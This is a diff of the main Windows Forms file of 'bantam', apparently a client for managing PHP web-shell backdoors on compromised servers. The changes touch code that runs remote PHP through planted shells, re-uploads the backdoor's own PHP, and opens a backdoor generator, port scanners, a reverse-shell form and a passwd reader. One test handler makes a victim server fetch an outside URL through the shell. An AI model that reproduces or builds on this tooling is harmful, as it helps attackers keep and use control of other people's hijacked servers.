@@ -15,12 +15,12 @@ namespace bantam
     public partial class BantamMain : Form
     {
         /// <summary>
-        /// 
+        /// Full path and name of xml file if a file has opened (used for saving)
         /// </summary>
         public static string g_OpenFileName;
 
         /// <summary>
-        /// 
+        /// Full url of the Shell we have selected in the main listview
         /// </summary>
         public static string g_SelectedShellUrl;
 
@@ -28,16 +28,6 @@ namespace bantam
         /// 
         /// </summary>
         public static ConcurrentDictionary<String, ShellInfo> Shells = new ConcurrentDictionary<String, ShellInfo>();
-
-        /// <summary>
-        /// Static Forms
-        /// </summary>
-        public ModifyShell addClientForm, updateHostForm;
-
-        /// <summary>
-        /// 
-        /// </summary>
-        public BackdoorGenerator backdoorGenerator;
 
         /// <summary>
         ///
@@ -52,6 +42,9 @@ namespace bantam
         }
 
         #region HELPER_FUNCTIONS
+
+
+        //public void AddShellLog(string )
 
         /// <summary>
         /// 
@@ -186,6 +179,7 @@ namespace bantam
                         if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                             AddShellToListView(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
                             Shells[shellUrl].Update(pingWatch.ElapsedMilliseconds, data);
+                            Shells[shellUrl].down = false;
                         } else {
                             AddShellToListView(shellUrl, "-");
                         }
@@ -315,19 +309,37 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Edits the PHP code of BANTAM that is stored online ! @dangerous
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void viewPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void editPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
-            bool encrypt = Shells[shellUrl].responseEncryption;
+            bool encryptResponse = Shells[shellUrl].responseEncryption;
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
-            string phpCode = PhpHelper.ReadFileFromVar(PhpHelper.phpServerScriptFileName, encrypt);
+            //windows does not currently support uploading
+            if (Shells[shellUrl].isWindows) {
+                return;
+            }
 
-            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Bantam PHP Code", encrypt, responseEncryptionMode);
+            string phpCode = PhpHelper.ReadFileFromVar(PhpHelper.phpServerScriptFileName, encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+
+            if (string.IsNullOrEmpty(response.Result)) {
+                //todo level 3 logging
+                return;
+            }
+
+            string result = response.Result;
+
+            if (encryptResponse) {
+                result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
+            }
+
+            UploadFile u = new UploadFile(shellUrl, result, true);
+            u.ShowDialog();
         }
 
         /// <summary>
@@ -437,6 +449,7 @@ namespace bantam
                 if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0) {
                     //Clear previously cached treeview to only store 1 copy
                     if (!string.IsNullOrEmpty(g_SelectedShellUrl)
+                    && Shells[g_SelectedShellUrl].files != null
                     && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
                         Shells[g_SelectedShellUrl].files.Nodes.Clear();
                     }
@@ -488,31 +501,31 @@ namespace bantam
                 }
 
                 if (validTarget() == false) {
-                    lblDynCWD.Text = string.Empty;
-                    lblDynFreeSpace.Text = string.Empty;
-                    lblDynHDDSpace.Text = string.Empty;
-                    lblDynServerIP.Text = string.Empty;
-                    lblDynUname.Text = string.Empty;
-                    lblDynUser.Text = string.Empty;
-                    lblDynWebServer.Text = string.Empty;
-                    lblDynGroup.Text = string.Empty;
-                    lblDynPHP.Text = string.Empty;
+                    textBoxCWD.Text = string.Empty;
+                    textBoxFreeSpace.Text = string.Empty;
+                    textBoxHDDSpace.Text = string.Empty;
+                    textBoxServerIP.Text = string.Empty;
+                    textBoxUname.Text = string.Empty;
+                    textBoxUser.Text = string.Empty;
+                    textBoxWebServer.Text = string.Empty;
+                    textBoxGroup.Text = string.Empty;
+                    textBoxPHP.Text = string.Empty;
                     txtBoxFileBrowserPath.Text = string.Empty;
                     return;
                 } else {
-                    lblDynCWD.Text = Shells[g_SelectedShellUrl].cwd;
-                    lblDynFreeSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].freeHDDSpace) ? "0"
+                    textBoxCWD.Text = Shells[g_SelectedShellUrl].cwd;
+                    textBoxFreeSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].freeHDDSpace) ? "0"
                                          : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].freeHDDSpace));
 
-                    lblDynHDDSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].totalHDDSpace) ? "0"
+                    textBoxHDDSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].totalHDDSpace) ? "0"
                                         : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].totalHDDSpace));
 
-                    lblDynServerIP.Text = Shells[g_SelectedShellUrl].ip;
-                    lblDynUname.Text = Shells[g_SelectedShellUrl].unameRelease + " " + Shells[g_SelectedShellUrl].unameKernel;
-                    lblDynUser.Text = Shells[g_SelectedShellUrl].uid + " ( " + Shells[g_SelectedShellUrl].user + " )";
-                    lblDynWebServer.Text = Shells[g_SelectedShellUrl].serverSoftware;
-                    lblDynGroup.Text = Shells[g_SelectedShellUrl].gid + " ( " + Shells[g_SelectedShellUrl].group + " )";
-                    lblDynPHP.Text = Shells[g_SelectedShellUrl].PHP_Version;
+                    textBoxServerIP.Text = Shells[g_SelectedShellUrl].ip;
+                    textBoxUname.Text = Shells[g_SelectedShellUrl].unameRelease + " " + Shells[g_SelectedShellUrl].unameKernel;
+                    textBoxUser.Text = Shells[g_SelectedShellUrl].uid + " ( " + Shells[g_SelectedShellUrl].user + " )";
+                    textBoxWebServer.Text = Shells[g_SelectedShellUrl].serverSoftware;
+                    textBoxGroup.Text = Shells[g_SelectedShellUrl].gid + " ( " + Shells[g_SelectedShellUrl].group + " )";
+                    textBoxPHP.Text = Shells[g_SelectedShellUrl].PHP_Version;
                 }
 
                 if (tabControlMain.SelectedTab == tabPageFiles) {
@@ -587,11 +600,10 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void addToolStripMenuItem_Click(object sender, EventArgs e)
+        private void 
+            addToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (addClientForm == null) {
-                addClientForm = new ModifyShell();
-            }
+            ModifyShell addClientForm = new ModifyShell();
             addClientForm.Show();
         }
 
@@ -632,7 +644,7 @@ namespace bantam
                 listViewShells.SelectedItems[0].Remove();
                 if (Shells.ContainsKey(g_SelectedShellUrl)) {
 
-                    ShellInfo outShellInfo = new ShellInfo();
+                    ShellInfo outShellInfo;
                     Shells.TryRemove(g_SelectedShellUrl, out outShellInfo);
                 }
             }
@@ -661,7 +673,7 @@ namespace bantam
 
             listViewShells.FindItemWithText(shellURL).Remove();
 
-            ShellInfo shellInfoRemove = new ShellInfo();
+            ShellInfo shellInfoRemove;
             Shells.TryRemove(shellURL, out shellInfoRemove);
            
             Shells.TryAdd(shellURL, shellInfo);
@@ -675,9 +687,7 @@ namespace bantam
         /// <param name="e"></param>
         private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (backdoorGenerator == null) {
-                backdoorGenerator = new BackdoorGenerator();
-            }
+            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
             backdoorGenerator.Show();
         }
 
@@ -716,7 +726,7 @@ namespace bantam
                     foreach (ListViewItem lvClients in listViewShells.Items) {
                         if (Shells.ContainsKey(lvClients.Text)) {
 
-                            ShellInfo outShellInfo = new ShellInfo();
+                            ShellInfo outShellInfo;
                             Shells.TryRemove(lvClients.Text, out outShellInfo);
                         }
                         lvClients.Remove();
@@ -740,7 +750,7 @@ namespace bantam
                 string varName = Shells[shellUrl].requestArgName;
                 string varType = (Shells[shellUrl].sendDataViaCookie ? "cookie" : "post");
 
-                updateHostForm = new ModifyShell(shellUrl, varName, varType);
+                ModifyShell updateHostForm = new ModifyShell(shellUrl, varName, varType);
                 updateHostForm.Show();
             }
         }
@@ -1350,9 +1360,6 @@ namespace bantam
         /// <param name="e"></param>
         private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (validTarget() == false) {
-                return;
-            }
             Clipboard.SetText(g_SelectedShellUrl);
         }
 
@@ -1435,6 +1442,52 @@ namespace bantam
                     }
                 }
             }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void portScannerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            PortScanner ps = new PortScanner(g_SelectedShellUrl);
+            ps.ShowDialog();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void listViewShells_DragDrop(object sender, DragEventArgs e)
+        {
+            string[] s = (string[])e.Data.GetData(DataFormats.FileDrop, false);
+            MessageBox.Show(s.ToString());
+        }
+
+        private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            DistributedPortScanner ds = new DistributedPortScanner();
+            ds.ShowDialog();
+        }
+
+        private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
+                e.Handled = true;
+            }
+        }
+
+        private void tabPageInfo_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripMenuItemReverseShell_Click(object sender, EventArgs e)
+        {
+            ReverseShell reverseShellForm = new ReverseShell(g_SelectedShellUrl);
+            reverseShellForm.ShowDialog();
         }
 
         #endregion
@@ -1660,52 +1713,6 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void portScannerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            PortScanner ps = new PortScanner(g_SelectedShellUrl);
-            ps.ShowDialog();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void listViewShells_DragDrop(object sender, DragEventArgs e)
-        {
-            string[] s = (string[])e.Data.GetData(DataFormats.FileDrop, false);
-            MessageBox.Show(s.ToString());
-        }
-
-        private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
-        {
-            DistributedPortScanner ds = new DistributedPortScanner();
-            ds.ShowDialog();
-        }
-
-        private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
-                e.Handled = true;
-            }
-        }
-
-        private void tabPageInfo_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void toolStripMenuItem2_Click(object sender, EventArgs e)
-        {
-            ReverseShell reverseShellForm = new ReverseShell(g_SelectedShellUrl);
-            reverseShellForm.ShowDialog();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
         private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
@@ -1717,5 +1724,32 @@ namespace bantam
         }
 
         #endregion
+
+        private async void testToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string shellUrl = g_SelectedShellUrl;
+            bool encryptResponse = Shells[shellUrl].responseEncryption;
+            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.getBasicCurl("http://boards.4chan.org/hc/", encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+
+            if (string.IsNullOrEmpty(response.Result) == false) {
+                string result = response.Result;
+
+                if (encryptResponse) {
+                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
+
+                    BrowserView browserView = new BrowserView(result, 1000, 1000);
+                    browserView.ShowDialog();
+                }
+            }
+        }
+
+        private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
     }
 }
